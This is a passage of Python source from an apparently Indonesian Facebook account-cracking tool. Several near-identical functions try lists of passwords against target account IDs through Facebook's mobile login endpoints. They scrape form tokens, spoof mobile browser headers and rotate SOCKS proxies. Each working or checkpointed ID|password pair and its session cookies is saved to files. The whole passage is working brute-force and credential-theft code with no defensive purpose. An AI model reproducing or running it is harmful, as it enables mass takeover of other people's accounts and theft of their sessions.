jVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def Asepitgans_Xd(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Async {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen7)
	for pw in pwv:
		try:
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.cinyour.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE LAWAK V1]--------------------#
def cracklawakv1(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen8) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Iphone [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			link=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': idf, 
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': 'header',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true', 
'had_password_prefilled': 'true', 
'is_smart_lock': 'false', 
'bi_xrwh': 0
}
			heade ={'Host':'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug':'6kPPqq1tVlNAOQKlMbyQJKyIsCy+xVvedl1dnfzMw+SSrLi3buNNbTwQ+EKhqari1Co/wiELTB87WFOow+VCZw==','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="113", "Not=A?Brand";v="99","Google Chrome";v="113"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://iphone.facebook.com/login/device-based/login/async/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&refsrc=deprecated&lwv=101',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackprode(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen8)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Prode [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
